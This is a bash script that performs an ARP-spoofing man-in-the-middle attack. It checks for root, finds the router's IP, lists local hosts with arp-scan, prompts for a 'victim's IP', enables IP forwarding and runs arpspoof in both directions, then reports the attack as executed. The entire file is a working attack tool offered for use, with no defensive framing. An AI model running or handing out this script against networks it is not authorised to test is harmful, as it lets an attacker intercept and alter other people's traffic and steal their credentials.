#!/bin/bash

#check if user is root
if [ $(echo $USER) != "root" ]; then
	echo -e "\n[!]Please switch to user \e[1;31mroot\e[0m and run the script again."
	echo -e "[*]To switch to root, execute the command: \e[1;31msudo -i\e[0m"
	echo -e "[*]Execute this command next: bash $PWD/$0"
	exit 1
fi

#get router IP
RIP=$(route -n | grep UG | awk '{print $2}')
echo "Router IP: $RIP"

#get the ips in the arp-scan -l
echo -e "\nList of current IPs in the ARP table:"
sudo arp-scan -l | grep -E "^[0-9]{1,3}\." | awk '{print $1}'

#get victim's IP from user
VIP_CHECKER=0
echo
while [ "$VIP_CHECKER" -eq 0 ]
do
	read -p "[?]Enter the victim's IP: " VIP
	if [ ! -z "$VIP" ]; then
		VIP_CHECKER=1
	else
		echo -e "[!]No input, please enter again!\n"
	fi
done

#cat /proc/sys/net/ipv4/ip_forward 
echo '1'> /proc/sys/net/ipv4/ip_forward

xterm -e bash -c "arpspoof -t $RIP $VIP" &
xterm -e bash -c "arpspoof -t $VIP $RIP" &

echo -e "[*]Successfully executed MiTM attack!"

